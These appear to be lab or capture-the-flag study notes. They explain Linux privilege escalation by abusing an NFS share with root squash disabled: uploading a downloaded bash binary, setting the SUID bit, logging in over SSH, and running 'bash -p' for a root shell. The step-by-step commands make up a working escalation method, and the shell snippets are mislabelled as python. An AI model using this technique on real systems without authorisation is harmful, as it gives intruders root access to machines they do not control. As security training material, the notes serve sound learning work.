if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

## SUID
- To put it simply, if you have a file with the SUID bit set, and you run that file, it will be executed with the same level of access and permissions as the owner of the file, which is usually the super-user.
- This can be useful because it allows regular users to perform actions that normally require administrative or root privileges.
- For example, if you have a file with the SUID bit set and it is owned by the super-user, running that file will give you temporary super-user privileges, allowing you to perform tasks that are typically restricted to the super-user, such as accessing sensitive files or executing system-level commands.

## Method
- We're able to upload files to the NFS share, and control the permissions of these files.
- We can set the permissions of whatever we upload, in this case a bash shell executable.
- We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

## The Executable
```python
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
```

## Mapped Out Pathway:
    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS

## Above pathway example:
1. For "NFS Access" and "Gain Low Privilege Shell" step follow the [[NFS enumeration]]
2. Upload Bash Executable to the NFS share:
   - Downloading from github to download directory:
     ![[NFS1.png]]
     copying above file to /tmp/mount/ from ~/Downloads, as shown below
```python
cp ~/Downloads/bash .
```
I assume that, your current directory is /tmp/mount/.

3. Set SUID Permissions Through NFS Due To Misconfigured Root Squash :
   ![[NFS2.png]]

4. Login through SSH:
   ![[NFS3.png]]
	id_rsa is a identity file which contains the private key to connect with ssh.

5. Execute SUID Bit Bash Executable and Root Access:
   ![[NFS4.png]]
   The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

